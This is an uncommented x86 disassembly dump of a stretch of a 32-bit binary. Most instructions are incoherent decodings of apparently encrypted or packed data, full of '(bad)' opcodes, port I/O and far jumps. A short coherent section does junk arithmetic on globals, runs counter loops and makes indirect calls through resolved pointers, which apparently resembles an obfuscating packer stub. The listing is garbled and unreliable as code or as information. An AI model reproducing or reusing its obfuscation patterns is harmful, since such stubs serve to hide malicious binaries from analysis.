  4169ab:	sbb    al,0x47
  4169ad:	adc    dl,dh
  4169af:	dec    edi
  4169b0:	dec    edi
  4169b1:	xchg   ebp,eax
  4169b2:	fld    TBYTE PTR [esi+0x612747d3]
  4169b8:	push   ecx
  4169b9:	cmc    
  4169ba:	ret    0x6a67
  4169bd:	xchg   ecx,eax
  4169be:	pop    ds
  4169bf:	rol    BYTE PTR [ebx-0x4c],0x6d
  4169c3:	push   0x738e67a8
  4169c8:	imul   esp,DWORD PTR [ebp-0x2f],0xc1e6558e
  4169cf:	call   0xc8b8266e
  4169d4:	xchg   WORD PTR [ebx],si
  4169d7:	push   ds
  4169d8:	rcr    BYTE PTR [ebx+0x665c6193],cl
  4169de:	inc    eax
  4169df:	cmp    al,0x34
  4169e1:	dec    ecx
  4169e2:	xor    eax,0x5d762931
  4169e7:	jmp    0x41698f
  4169e9:	jns    0x41697e
  4169eb:	and    ebx,DWORD PTR [ebp+0x6a]
  4169ee:	(bad)  [edx+0x9c97b32]
  4169f4:	inc    eax
  4169f5:	aad    0x9f
  4169f7:	sub    BYTE PTR [esi-0x3e300a0],bl
  4169fd:	xor    BYTE PTR [edx],bh
  4169ff:	iret   
  416a00:	ja     0x416a5c
  416a02:	xchg   BYTE PTR [ebx],dl
  416a04:	data16 jge 0x416a4a
  416a07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a08:	jmp    0xaa1d:0x7fb0950d
  416a0f:	adc    edx,DWORD PTR [esp+edi*8+0x77922f7]
  416a16:	xor    eax,0x4a625b4e
  416a1b:	cmp    al,0x30
  416a1d:	push   0xffffffe1
  416a1f:	pop    ecx
  416a20:	lock (bad) [ebp+0x3f]
  416a24:	and    ebx,DWORD PTR [eax-0x16342b83]
  416a2a:	popf   
  416a2b:	pop    esi
  416a2c:	scas   eax,DWORD PTR es:[edi]
  416a2d:	mov    bh,0xbc
  416a2f:	mov    eax,0xbfb9ec52
  416a34:	mov    ebp,0xe6e2f1ec
  416a39:	dec    ecx
  416a3a:	cmp    DWORD PTR [ebx],ebp
  416a3c:	mov    esi,0xc82ce868
  416a41:	xlat   BYTE PTR ds:[ebx]
  416a42:	data16 jg 0x416a3a
  416a45:	dec    edx
  416a46:	cmp    al,BYTE PTR ds:0x200cdabf
  416a4c:	call   FWORD PTR [ebx-0x3fd254d3]
  416a52:	jb     0x416a00
  416a54:	ins    DWORD PTR es:[edi],dx
  416a55:	in     eax,0xb3
  416a57:	(bad)  
  416a5a:	jmp    0x416a34
  416a5c:	xchg   ecx,eax
  416a5d:	pop    edi
  416a5e:	in     al,0xf2
  416a60:	jl     0x416ad1
  416a62:	imul   ecx,eax,0xffffffa4
  416a65:	ds out 0xb7,eax
  416a68:	and    eax,0x9029b0d7
  416a6d:	adc    DWORD PTR ds:[ecx],0x3a91aab8
  416a74:	and    BYTE PTR [esi],cl
  416a76:	ins    BYTE PTR es:[edi],dx
  416a77:	sar    BYTE PTR [eax],0xb1
  416a7a:	inc    eax
  416a7b:	imul   edi,esi,0x1779bc2a
  416a81:	fldcw  WORD PTR [edi+esi*1]
  416a84:	jne    0x416a09
  416a86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a87:	dec    ebp
  416a88:	mov    ah,0x9e
  416a8a:	xor    BYTE PTR [ebp-0x58],bh
  416a8d:	inc    esp
  416a8e:	in     al,0x94
  416a90:	mov    BYTE PTR [ebp+0x34bb51ca],dl
  416a96:	push   eax
  416a97:	bound  ebp,QWORD PTR [eax]
  416a99:	adc    al,0xff
  416a9b:	jne    0x416a7d
  416a9d:	mov    eax,DWORD PTR [ebp-0x8]
  416aa0:	mov    eax,DWORD PTR [eax]
  416aa2:	mov    eax,DWORD PTR [eax]
  416aa4:	mov    eax,DWORD PTR [eax]
  416aa6:	call   eax
  416aa8:	mov    eax,DWORD PTR [ebp-0x34]
  416aab:	mov    ecx,DWORD PTR ds:0x424086
  416ab1:	add    DWORD PTR [eax],ecx
  416ab3:	pop    edi
  416ab4:	pop    esi
  416ab5:	leave  
  416ab6:	ret    
  416ab7:	push   ebp
  416ab8:	mov    ebp,esp
  416aba:	sub    esp,0x18
  416abd:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  416ac4:	lea    eax,[ebp+0x14]
  416ac7:	mov    edx,DWORD PTR ds:0x42c00c
  416acd:	sub    DWORD PTR ds:0x42c01c,edx
  416ad3:	mov    DWORD PTR [ebp-0x4],eax
  416ad6:	and    DWORD PTR ds:0x42c01c,ebx
  416adc:	push   esi
  416add:	sub    ecx,esi
  416adf:	mov    esi,0xf89c85b6
  416ae4:	sub    ecx,ecx
  416ae6:	mov    DWORD PTR [ebp-0xc],esi
  416ae9:	or     DWORD PTR ds:0x42b000,0x59c6
  416af3:	lea    eax,[ebp-0xc]
  416af6:	sub    DWORD PTR ds:0x42b014,0x4110
  416b00:	mov    DWORD PTR [ebp-0x14],eax
  416b03:	add    ecx,ecx
  416b05:	mov    eax,DWORD PTR [ebp-0xc]
  416b08:	mov    edx,DWORD PTR [ebp-0x14]
  416b0b:	adc    DWORD PTR ds:0x429014,0x59c
  416b15:	mov    ecx,0x7510893
  416b1a:	xor    eax,ecx
  416b1c:	sub    DWORD PTR ds:0x42b014,0x42b004
  416b26:	add    eax,0x3272db
  416b2b:	mov    DWORD PTR [edx],eax
  416b2d:	mov    edx,DWORD PTR ds:0x42a004
  416b33:	add    DWORD PTR ds:0x429000,edx
  416b39:	mov    eax,ds:0x423e82
  416b3e:	mov    edx,DWORD PTR ds:0x42901c
  416b44:	add    DWORD PTR ds:0x429000,edx
  416b4a:	mov    edx,DWORD PTR [ebp-0x4]
  416b4d:	sub    DWORD PTR ds:0x42d000,0x780c
  416b57:	mov    eax,DWORD PTR [eax]
  416b59:	add    eax,DWORD PTR [edx]
  416b5b:	add    DWORD PTR ds:0x42900c,ecx
  416b61:	push   edi
  416b62:	and    DWORD PTR ds:0x429020,0x0
  416b6c:	mov    edx,DWORD PTR ds:0x429020
  416b72:	inc    edx
  416b73:	mov    DWORD PTR ds:0x429020,edx
  416b79:	cmp    DWORD PTR ds:0x429020,0x25
  416b80:	jne    0x416b8f
  416b86:	push   DWORD PTR [ebp-0x20]
  416b89:	call   DWORD PTR ds:0x425028
  416b8f:	cmp    DWORD PTR ds:0x429020,0x19
  416b96:	jb     0x416b6c
  416b9c:	add    DWORD PTR ds:0x42c01c,0x73bd
  416ba6:	mov    DWORD PTR [ebp-0x8],eax
  416ba9:	adc    DWORD PTR ds:0x42d00c,ecx
  416baf:	mov    edi,DWORD PTR [ebp+0x8]
  416bb2:	sbb    DWORD PTR ds:0x42d018,0x1580
  416bbc:	mov    eax,ds:0x42400a
  416bc1:	and    DWORD PTR ds:0x42b01c,0x0
  416bcb:	jmp    0x416bdd
  416bd0:	mov    edx,DWORD PTR ds:0x42b01c
  416bd6:	inc    edx
  416bd7:	mov    DWORD PTR ds:0x42b01c,edx
  416bdd:	cmp    DWORD PTR ds:0x42b01c,0x1a
  416be4:	jae    0x416c47
  416bea:	cmp    DWORD PTR ds:0x42b01c,0x10
  416bf1:	jne    0x416c1c
  416bf7:	push   0x2d19
  416bfc:	push   DWORD PTR [ebp-0x10]
  416bff:	push   0x42d014
  416c04:	push   0x14d6
  416c09:	push   0x3bac
  416c0e:	push   0x6779
  416c13:	push   DWORD PTR [ebp-0xc]
  416c16:	call   DWORD PTR ds:0x42502c
  416c1c:	cmp    DWORD PTR ds:0x42b01c,0xf
  416c23:	jne    0x416c38
  416c29:	xor    edx,edx
  416c2b:	add    edx,DWORD PTR ds:0x42b01c
  416c31:	inc    edx
  416c32:	mov    DWORD PTR ds:0x42b01c,edx
  416c38:	jmp    0x416bd0
  416c3d:	adc    DWORD PTR ds:0x429028,0x58d4
  416c47:	mov    eax,DWORD PTR [eax+0x198]
  416c4d:	mov    edx,DWORD PTR ds:0x42438d
  416c53:	mov    edx,DWORD PTR [edx]
  416c55:	add    DWORD PTR ds:0x42d008,edx
  416c5b:	xor    edi,ecx
  416c5d:	or     edx,0x793e
  416c63:	jmp    0x41901b
  416c68:	paddsw mm6,QWORD PTR es:[eax+0x63a36ce3]
  416c70:	mov    eax,0xf3e19036
  416c75:	push   es
  416c76:	mov    al,ds:0x61247a76
  416c7b:	(bad)  
  416c7c:	(bad)  
  416c7d:	pop    edi
  416c7e:	bound  esp,QWORD PTR [edx+0x20]
  416c81:	mov    dl,0x4
  416c83:	xor    BYTE PTR ds:0xd63b050a,bl
  416c89:	xor    ch,ch
  416c8b:	adc    BYTE PTR [eax+eax*4],bl
  416c8e:	dec    eax
  416c8f:	xchg   BYTE PTR [ebx+0x7997d6a5],dl
  416c95:	or     al,0xab
  416c97:	(bad)  
  416c98:	xlat   BYTE PTR ds:[ebx]
  416c99:	scas   eax,DWORD PTR es:[edi]
  416c9a:	mov    esi,0xa05e4cfe
  416c9f:	ret    0x5b28
  416ca2:	ds push eax
  416ca4:	inc    ebp
  416ca5:	xchg   BYTE PTR [edx+0x4f],ah
  416ca8:	jge    0x416d21
  416caa:	sbb    eax,0xd0eb0198
  416caf:	jge    0x416c90
  416cb1:	add    al,0xed
  416cb3:	and    al,0x4f
  416cb5:	scas   al,BYTE PTR es:[edi]
  416cb6:	hlt    
  416cb7:	pop    esi
  416cb8:	cmp    al,0x46
  416cba:	xchg   ebx,eax
  416cbb:	sub    al,0x8a
  416cbd:	add    al,0x14
  416cbf:	inc    ecx
  416cc0:	xchg   edx,eax
  416cc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cc2:	shl    BYTE PTR [edx],1
  416cc4:	xor    al,0x17
  416cc6:	add    BYTE PTR [ebx-0x4358a926],0x5f
  416ccd:	int    0x33
  416ccf:	jno    0x416d45
  416cd1:	mov    ds:0xb1711be0,al
  416cd6:	or     al,al
  416cd8:	mov    eax,0xddac7dcf
  416cdd:	fnsave [eax-0x4ad57987]
  416ce3:	xchg   ebx,eax
  416ce4:	xor    BYTE PTR [esp+ebx*2-0x5b2d3065],dh
  416ceb:	leave  
  416cec:	jns    0x416c71
  416cee:	sbb    DWORD PTR [ecx],eax
  416cf0:	mov    esp,0xf6c6b9a7
  416cf5:	inc    edi
  416cf6:	les    ecx,FWORD PTR [esi+0x1b8cbfec]
  416cfc:	ds das 
  416cfe:	mov    dh,dl
  416d00:	shr    edi,1
  416d02:	cmp    DWORD PTR [ecx-0x12dff0d5],ecx
  416d08:	shl    BYTE PTR [ebx+0xe],cl
  416d0b:	pop    edx
  416d0c:	adc    eax,0x89b7fdaf
  416d11:	pop    ebx
  416d12:	jl     0x416cab
  416d14:	cdq    
  416d15:	mov    ds,WORD PTR [edx]
  416d17:	mov    dh,0x64
  416d19:	test   eax,0x80586593
  416d1e:	lods   eax,DWORD PTR ds:[esi]
  416d1f:	(bad)  
  416d20:	sub    BYTE PTR [edi],cl
  416d22:	aam    0x87
  416d24:	add    eax,ebx
  416d26:	sbb    eax,0xcb3508b2
  416d2b:	test   BYTE PTR [esi+0x50],ah
  416d2e:	repz imul esp,DWORD PTR [ecx],0x1c0af2fa
  416d35:	pop    ds
  416d36:	fst    DWORD PTR [ecx+0x47]
  416d39:	lock jle 0x416db6
  416d3c:	mov    ah,0x6f
  416d3e:	and    al,0xc
  416d40:	cmc    
  416d41:	sbb    edi,DWORD PTR [ebx-0x54405681]
  416d47:	xlat   BYTE PTR ds:[ebx]
  416d48:	inc    ebp
  416d49:	test   eax,ebp
  416d4b:	xlat   BYTE PTR ds:[ebx]
  416d4c:	sbb    bl,ch
  416d4e:	das    
  416d4f:	mov    bh,0xe4
  416d51:	adc    al,0xfd
  416d53:	ret    
  416d54:	mov    ds:0xd58413c5,eax
  416d59:	mov    ds:0x1ff499d7,al
  416d5e:	adc    eax,edi
  416d60:	loope  0x416d3b
  416d62:	std    
  416d63:	jl     0x416d5c
  416d65:	repnz in eax,dx
  416d67:	xor    eax,0x70aeec37
  416d6c:	loop   0x416de6
  416d6e:	out    0xc1,al
  416d70:	lahf   
  416d71:	jne    0x416db2
  416d73:	mov    edx,0x291280e4
  416d78:	push   ebx
  416d79:	and    DWORD PTR [edi+0x4605090e],edx
  416d7f:	lods   eax,DWORD PTR ds:[esi]
  416d80:	push   ds
  416d81:	les    edi,FWORD PTR [ebx-0x4c9adb8]
  416d87:	iret   
  416d88:	lods   al,BYTE PTR ds:[esi]
  416d89:	call   0x6348:0xb76a5f14
  416d90:	mov    esp,0xa495b647
  416d95:	(bad)  
  416d96:	les    eax,FWORD PTR [edi]
  416d98:	lds    eax,FWORD PTR [ebp+0x60]
  416d9b:	in     al,dx
  416d9c:	loopne 0x416dfa
  416d9e:	xchg   ecx,eax
  416d9f:	ja     0x416ddf
  416da1:	sub    BYTE PTR [ebx+0x32],0x6d
  416da5:	stos   DWORD PTR es:[edi],eax
  416da6:	jp     0x416d51
  416da8:	and    ecx,DWORD PTR [edx+0x449dc1d1]
  416dae:	sub    DWORD PTR [eax-0x48],edx
  416db1:	cli    
  416db2:	dec    edx
  416db3:	mov    eax,0xc6641f96
  416db8:	push   esp
  416db9:	dec    edi
  416dba:	push   0xffffffb1
  416dbc:	test   al,0x2c
  416dbe:	dec    edi
  416dbf:	xchg   ebp,eax
  416dc0:	sub    ebx,0x2f
  416dc3:	cmp    ch,ah
  416dc5:	rcl    bl,1
  416dc7:	and    edx,DWORD PTR [ebx-0x29]
  416dca:	lds    esi,FWORD PTR [edi-0x6a]
  416dcd:	pop    esp
  416dce:	cmp    BYTE PTR [esi+0x7a],ch
  416dd1:	icebp  
  416dd2:	fcomp  DWORD PTR [esi+esi*1-0x66c5aa99]
  416dd9:	adc    eax,edi
  416ddb:	loope  0x416d7d
  416ddd:	aad    0x3b
  416ddf:	xchg   edx,eax
  416de0:	daa    
  416de1:	leave  
  416de2:	arpl   WORD PTR [edx+0x53],ax
  416de5:	adc    DWORD PTR [ecx+eiz*2+0x1d],edx
  416de9:	ffree  st(3)
  416deb:	(bad)  
  416dec:	sbb    esp,DWORD PTR [edx-0x38]
  416def:	popa   
  416df0:	inc    edi
  416df1:	inc    ebx
  416df2:	mov    edx,?
  416df4:	test   al,0xda
  416df6:	inc    edx
  416df7:	or     DWORD PTR ds:0x3f8c5067,edi
  416dfd:	or     DWORD PTR [ecx-0x33905689],edi
  416e03:	clc    
  416e04:	ret    
  416e05:	pushf  
  416e06:	pop    ds
  416e07:	push   eax
  416e08:	mov    eax,0xfcf0d746
  416e0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e0e:	pusha  
  416e0f:	mov    BYTE PTR [edx+0x79a128e0],bh
  416e15:	mov    ah,0x5a
  416e17:	and    DWORD PTR [edi+ebp*8-0x74],ecx
  416e1b:	gs push ebx
  416e1d:	retf   0x5290
  416e20:	or     BYTE PTR [ebp+0x2],al
  416e23:	or     DWORD PTR [edx],ebp
  416e25:	push   ds
  416e26:	xor    cl,ah
  416e28:	jle    0x416ddf
  416e2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e2b:	or     ebx,0xffffffb3
  416e2e:	cmp    dl,al
  416e30:	inc    esp
  416e31:	imul   ebp,DWORD PTR [ebx+0x69],0x8a00672c
  416e38:	fnsave fs:[eax-0x1edab17b]
  416e3f:	fwait
  416e40:	call   0xdf92b1e8
  416e45:	xor    DWORD PTR [eax+0x50d480f2],esp
  416e4b:	(bad)  
  416e4c:	fcomp  QWORD PTR [ebp+0xf]
  416e4f:	mulps  xmm0,XMMWORD PTR [ebp-0x2d99fcdc]
  416e56:	outs   dx,DWORD PTR ds:[esi]
  416e57:	add    DWORD PTR [edi+0x1a721458],edi
  416e5d:	in     al,0xcb
  416e5f:	retf   
  416e60:	xchg   ebx,eax
  416e61:	inc    edx
  416e62:	fcmovbe st,st(4)
  416e64:	jno    0x416dea
  416e66:	into   
  416e67:	in     eax,0x50
  416e69:	push   0x1
  416e6b:	xchg   esi,eax
  416e6c:	arpl   WORD PTR [edx+0x23],di
  416e6f:	adc    bl,ah
  416e71:	add    al,0xa8
  416e73:	or     DWORD PTR [edi+0x38],edx
  416e76:	add    cl,bl
  416e78:	jb     0x416e22
  416e7a:	mov    ebp,0x9e0bd6e3
  416e7f:	(bad)  
  416e80:	in     eax,0x4f
  416e82:	mov    al,0xc4
  416e84:	xchg   edx,eax
  416e85:	xor    edi,DWORD PTR [ebp+0x6bd083b5]
  416e8b:	clc    
  416e8c:	pop    ecx
  416e8d:	mov    esi,0x1929ba09
  416e92:	mov    BYTE PTR [ebx+0x31],ah
  416e95:	stos   WORD PTR es:[edi],ax
  416e97:	retf   
  416e98:	sbb    ebp,ebx
  416e9a:	outs   dx,BYTE PTR ds:[esi]
  416e9b:	mov    eax,0xc1122c1c
  416ea0:	aas    
  416ea1:	xchg   esp,eax
  416ea2:	adc    DWORD PTR [eax],edi
  416ea4:	push   es
  416ea5:	add    dh,BYTE PTR [edx+0x7]
  416ea8:	jle    0x416f29
  416eaa:	push   esp
  416eab:	cmc    
  416eac:	push   ss
  416ead:	sbb    esi,0xffffffa2
  416eb0:	lock adc eax,0x7609c166
  416eb6:	inc    ebx
  416eb7:	mov    ebx,0x83d3f316
  416ebc:	dec    esi
  416ebd:	sbb    DWORD PTR [edx-0xe5372d0],0x2
  416ec4:	inc    ebp
  416ec5:	adc    al,0x84
  416ec7:	repz loopne 0x416eaf
  416eca:	inc    esp
  416ecb:	xor    esp,ebx
  416ecd:	ror    eax,1
  416ecf:	add    BYTE PTR [ebp+0x38],al
  416ed2:	xor    al,0xde
  416ed4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ed5:	dec    ecx
  416ed6:	push   edi
  416ed7:	popa   
  416ed8:	and    bh,BYTE PTR [ebx]
  416eda:	or     BYTE PTR [ecx+0x43],bh
  416edd:	push   DWORD PTR [esi+0x6cc6dc16]
  416ee3:	popf   
  416ee4:	in     eax,0x93
  416ee6:	add    dl,BYTE PTR [ecx]
  416ee8:	push   eax
  416ee9:	add    al,0x69
  416eeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416eec:	out    dx,eax
  416eed:	jecxz  0x416e78
  416eef:	cmp    edi,ecx
  416ef1:	xchg   esi,eax
  416ef2:	gs cmc 
  416ef4:	push   eax
  416ef5:	mov    esi,0xb953381
  416efa:	std    
  416efb:	push   esi
  416efc:	cmp    BYTE PTR [ecx-0x481b4dda],0xd5
  416f03:	je     0x416f6f
  416f05:	ret    0x7ba3
  416f08:	bound  edx,QWORD PTR [esp+eiz*8-0x25]
  416f0c:	jge    0x416f41
  416f0e:	sub    DWORD PTR [eax+0x15098893],esp
  416f14:	and    eax,0xaed0d436
  416f19:	je     0x416efb
  416f1b:	loop   0x416f55
  416f1d:	cmc    
  416f1e:	sbb    al,0x4c
  416f20:	stos   BYTE PTR es:[edi],al
  416f21:	sbb    eax,DWORD PTR [esi-0x3c4962d7]
  416f27:	xlat   BYTE PTR ds:[ebx]
  416f28:	dec    ecx
  416f29:	call   0x5d229235
  416f2e:	je     0x416f9f
  416f30:	push   ecx
  416f31:	xchg   ebx,eax
  416f32:	pushf  
  416f33:	stos   BYTE PTR es:[edi],al
  416f34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f35:	cmc    
  416f36:	scas   al,BYTE PTR es:[edi]
  416f37:	lea    ebx,[esi+0x70]
  416f3a:	pop    esp
  416f3b:	dec    edi
  416f3c:	icebp  
  416f3d:	shr    esp,cl
  416f3f:	in     al,dx
  416f40:	push   eax
  416f41:	(bad)  
  416f42:	out    dx,al
  416f43:	out    0x80,al
  416f45:	pop    ebx
  416f46:	push   0xd6fc8740
  416f4b:	adc    al,0x86
  416f4d:	push   ecx
  416f4e:	imul   ebp,DWORD PTR [ebp+0x2f],0x57
  416f52:	push   es
  416f53:	aas    
  416f54:	das    
  416f55:	mov    edi,0x76a50d97
  416f5a:	push   0x2a
  416f5c:	ficom  WORD PTR [edi+ebx*4+0x4fc7be8b]
  416f63:	mov    ?,WORD PTR [edi+0xc]
  416f66:	fdivr  st,st(7)
  416f68:	cs in  eax,0x2a
  416f6b:	sub    edi,0x5e81e01b
  416f71:	(bad)  
  416f72:	inc    ebx
  416f73:	cmp    DWORD PTR [edi-0x79],edi
  416f76:	repz test BYTE PTR [ecx-0x76],bl
  416f7a:	je     0x416f20
  416f7c:	in     eax,dx
  416f7d:	ins    DWORD PTR es:[edi],dx
  416f7e:	pop    es
  416f7f:	or     BYTE PTR [edx+0x5a300d57],bh
  416f85:	push   ebp
  416f86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f87:	imul   ebp,DWORD PTR [ecx],0xffffffe7
  416f8a:	lds    edx,FWORD PTR [esi]
  416f8c:	inc    esp
  416f8d:	mov    bh,0x54
  416f8f:	lds    esp,FWORD PTR [eax]
  416f91:	xlat   BYTE PTR ds:[ebx]
  416f92:	out    0xb5,eax
  416f94:	cmp    DWORD PTR fs:[eax-0x4e],esp
  416f98:	mov    fs,WORD PTR [eax-0x46ff0ed9]
  416f9e:	fstp   st(4)
  416fa0:	retf   
  416fa1:	mov    ds:0xd52e2ebd,al
  416fa6:	add    edi,esi
  416fa8:	add    ah,BYTE PTR [ecx]
  416faa:	cmp    BYTE PTR ds:0x800eea01,bh
  416fb0:	repz push ebp
  416fb2:	cwde   
  416fb3:	mov    ch,0x7d
  416fb5:	jnp    0x417031
  416fb7:	ror    DWORD PTR [eax+0x4e],1
  416fba:	pop    esp
  416fbb:	test   DWORD PTR [edi],ecx
  416fbd:	retf   0x1826
  416fc0:	mov    ebp,0xdad3552e
  416fc5:	add    eax,0xfca3e66c
  416fca:	pop    eax
  416fcb:	imul   edi,DWORD PTR [esi-0x7a],0xef5c3093
  416fd2:	inc    edi
  416fd3:	ja     0x416fbc
  416fd5:	mov    bl,0xbb
  416fd7:	push   ecx
  416fd8:	rcr    BYTE PTR [esp+eax*1],1
  416fdb:	addr16 cs dec edx
  416fde:	mov    esp,0xb895bd79
  416fe3:	dec    ebx
  416fe4:	cmp    al,0x9d
  416fe6:	push   esi
  416fe7:	push   0x752ebc11
  416fec:	push   es
  416fed:	imul   esi,DWORD PTR [ebp+eax*4+0x6e],0x4828c13b
  416ff5:	or     cl,ah
  416ff7:	repz inc esi
  416ff9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ffa:	fnsetpm(287 only) 
  416ffc:	cmp    eax,0xf765d231
  417001:	and    eax,0x62be42f0
  417006:	aas    
  417007:	sub    ebp,DWORD PTR [eax]
  417009:	scas   eax,DWORD PTR es:[edi]
  41700a:	xor    DWORD PTR [esi-0x54],eax
  41700d:	jmp    0x42e:0x22839503
  417014:	ret    0x58f5
  417017:	call   0xa629af7c
  41701c:	xor    ah,BYTE PTR [ebx]
  41701e:	jb     0x416fa3
  417020:	or     eax,0x395b1db7
  417025:	shr    esp,cl
  417027:	fidivr WORD PTR [eax-0x1a367f45]
  41702d:	sbb    DWORD PTR [ecx+0x11a57f14],ecx
  417033:	add    DWORD PTR [ecx],0xffffff82
  417036:	mov    al,ds:0x96d06755
  41703b:	inc    esi
  41703c:	repz imul ebp,DWORD PTR [ebp-0x52e276dc],0xfffffff2
  417044:	out    0x51,al
  417046:	ret    0x4609
  417049:	push   0x4d
  41704b:	and    dl,dl
  41704d:	aaa    
  41704e:	fcmovbe st,st(5)
  417050:	lods   al,BYTE PTR ds:[esi]
  417051:	lock test al,0xa0
  417054:	pop    ecx
  417055:	adc    cl,BYTE PTR [ecx+ebx*2+0x3f]
  417059:	iret   
  41705a:	xor    ebx,eax
  41705c:	add    ebx,DWORD PTR [ebp-0x60]
  41705f:	or     BYTE PTR [ecx],cl
  417061:	inc    esi
  417062:	mov    bl,0x9a
  417064:	sbb    eax,0x93b8addf
  417069:	add    ebp,DWORD PTR [ecx+esi*2-0x2b]
  41706d:	gs out 0x62,eax
  417070:	jnp    0x417043
  417072:	push   esi
  417073:	jno    0x4170a4
  417075:	imul   edx,ebx,0x9a0865e7
  41707b:	inc    ebp
  41707c:	xor    DWORD PTR [edx+0x52],esi
  41707f:	lock xchg BYTE PTR [esi+0x79],bl
  417083:	daa    
  417084:	mov    cl,0xe1
  417086:	out    dx,eax
  417087:	fs sbb al,0xf9
  41708a:	iret   
  41708b:	jp     0x4170c2
  41708d:	call   0x53e9957
  417092:	add    DWORD PTR [ebp+0x3770dd6b],0xb9c781a5
  41709c:	std    
  41709d:	ror    edi,1
  41709f:	and    DWORD PTR [esi],ebp
  4170a1:	xlat   BYTE PTR ds:[ebx]
  4170a2:	mov    esi,0xc2379b5e
  4170a7:	pop    DWORD PTR [edx+0x25770827]
  4170ad:	sub    edi,DWORD PTR [ebx+edx*8]
  4170b0:	dec    edx
  4170b1:	out    0xc0,eax
  4170b3:	out    0x48,eax
  4170b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170b6:	mov    ecx,0x588fdc64
  4170bb:	fldenv [eax+ecx*1]
  4170be:	jp     0x41705d
  4170c0:	mov    ecx,DWORD PTR [edi+0x58]
  4170c3:	fs xchg esp,eax
  4170c5:	or     cl,ch
  4170c7:	inc    dx
  4170c9:	mov    ebp,0x192800c3
  4170ce:	adc    ebp,DWORD PTR [ebp+0x4e]
  4170d1:	(bad)  
  4170d3:	cmp    ah,BYTE PTR [ebx]
  4170d5:	dec    ecx
  4170d6:	push   esp
  4170d7:	sub    eax,0xdf90d6f6
  4170dc:	and    esi,edi
  4170de:	jnp    0x41715e
  4170e0:	in     eax,0x3f
  4170e2:	rol    DWORD PTR [eax-0x48165edb],1
  4170e8:	dec    edx
  4170e9:	dec    edx
  4170ea:	test   al,0xbf
  4170ec:	in     al,dx
  4170ed:	(bad)  
  4170ee:	adc    edi,DWORD PTR [edx-0xf]
  4170f1:	xchg   ebx,eax
  4170f2:	ror    ah,0xf8
  4170f5:	inc    eax
  4170f6:	rcl    BYTE PTR [edx+eiz*1+0x43],cl
  4170fa:	jecxz  0x41713a
  4170fc:	push   eax
  4170fd:	xchg   edi,eax
  4170fe:	and    BYTE PTR [ecx+eiz*8+0x6],cl
  417102:	test   al,0x76
  417104:	add    DWORD PTR [esp+ecx*4-0x68],esi
  417108:	push   ebp
  417109:	and    DWORD PTR [edi],edi
  41710b:	int3   
  41710c:	xchg   edx,eax
  41710d:	out    0xba,al
  41710f:	nop
  417110:	jge    0x417121
  417112:	xchg   esp,eax
  417113:	popf   
  417114:	jp     0x417184
  417116:	repnz mov edi,esp
  417119:	lds    ecx,FWORD PTR ss:[edi+0x33c2db53]
  417120:	inc    esi
  417121:	cwde   
  417122:	jo     0x417184
  417124:	xchg   ecx,eax
  417125:	mov    ch,0xe9
  417127:	push   ebx
  417128:	dec    ebx
  417129:	xor    bl,ch
  41712b:	(bad)  
  41712c:	sti    
  41712d:	and    al,0xd0
  41712f:	push   ebp
  417130:	sub    eax,esp
  417132:	cli    
  417133:	nop
  417134:	nop
  417135:	push   edx
  417137:	lahf   
  417138:	xchg   BYTE PTR [ecx+0x4253ffde],bh
  41713e:	(bad)  
  41713f:	(bad)  
  417141:	add    BYTE PTR [ecx],dl
  417143:	test   BYTE PTR [ebx-0x6ab77864],dl
  417149:	fild   QWORD PTR [esi-0x4c514a0e]
  41714f:	add    bh,dl
  417151:	dec    eax
  417152:	jl     0x41716b
  417154:	inc    ebp
  417155:	inc    esi
  417156:	xchg   esi,eax
  417157:	les    esi,FWORD PTR [edi]
  417159:	add    DWORD PTR [eax],edi
  41715b:	frstor [ecx-0xf61bfe1]
  417161:	sub    esi,DWORD PTR [esi+edi*4]
  417164:	ret    0xa766
  417167:	sbb    al,0xd
  417169:	xor    edi,eax
  41716b:	sub    ch,0x41
  41716e:	pop    ebx
  41716f:	int    0x9d
  417171:	and    al,0x87
  417173:	pop    ecx
  417174:	sub    DWORD PTR [eax],0x1269a4b8
  41717a:	sub    esi,DWORD PTR [ecx+0x64]
  41717d:	xor    al,0x9
  41717f:	fs sub edx,0xfffffff5
  417183:	ficomp WORD PTR [ebp+0x7b8a828a]
  417189:	int3   
  41718a:	and    DWORD PTR [ebx+ebx*8-0x33],esi
  41718e:	dec    esi
  41718f:	into   
  417190:	fs (bad) 
  417192:	adc    eax,DWORD PTR [eax+0x60a0124d]
  417198:	jne    0x41718d
  41719a:	pop    ebp
  41719b:	ss inc ebx
  41719d:	cli    
  41719e:	inc    ecx
  41719f:	mov    eax,0x736b2c26
  4171a4:	sub    eax,0xd740c405
  4171a9:	push   bp
  4171ab:	adc    DWORD PTR [ebx],edi
  4171ad:	cmp    BYTE PTR [ebx+0xf],dl
  4171b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171b1:	rol    DWORD PTR [ecx],1
  4171b3:	inc    esp
  4171b4:	es sbb al,0x7
  4171b7:	add    al,0x95
  4171b9:	mov    dl,0x52
  4171bb:	pop    eax
  4171bc:	cwde   
  4171bd:	mov    eax,0x773f21bf
  4171c2:	or     eax,0xb7075c1c
  4171c7:	adc    DWORD PTR [esp+eax*1-0x780241ae],0xe8e3ba3c
  4171d2:	(bad)  
  4171d3:	xor    ah,BYTE PTR [ebx+eiz*8-0x4d]
  4171d7:	add    BYTE PTR [esi+ebx*8-0x3e],0x5d
  4171dc:	cmp    edx,DWORD PTR [edx]
  4171de:	cdq    
  4171df:	jns    0x41719b
  4171e1:	adc    bl,bh
  4171e3:	fisttp DWORD PTR [esi]
  4171e5:	cmp    DWORD PTR [ebp+0x68],edi
  4171e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171e9:	call   0x1252:0x80d4d07a
  4171f0:	jno    0x41722b
  4171f2:	fimul  WORD PTR [edi]
  4171f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
